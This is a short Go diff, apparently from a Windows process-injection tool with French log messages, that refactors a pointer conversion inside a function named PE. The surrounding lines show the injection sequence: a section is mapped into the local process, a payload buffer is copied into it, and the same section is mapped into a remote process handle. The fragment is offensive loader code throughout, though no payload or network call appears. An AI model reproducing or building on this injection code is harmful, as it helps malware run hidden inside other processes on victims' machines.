@@ -10,7 +10,6 @@ import (
 	"os"
 	"slices"
 	"syscall"
-	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
@@ -66,7 +65,7 @@ func PE(path string) {
 	localBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, curHandle, size, 0)
 
 	fmt.Printf("mapViewOfSection réussie \n")
-	e.Memcpy(localBaseAddr, unsafe.Pointer(&payload[0]), len(payload))
+	e.Memcpy(localBaseAddr, p.ToUintptr(&payload[0]), len(payload))
 
 	remoteBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, procHandle, size, 0)
 	fmt.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)
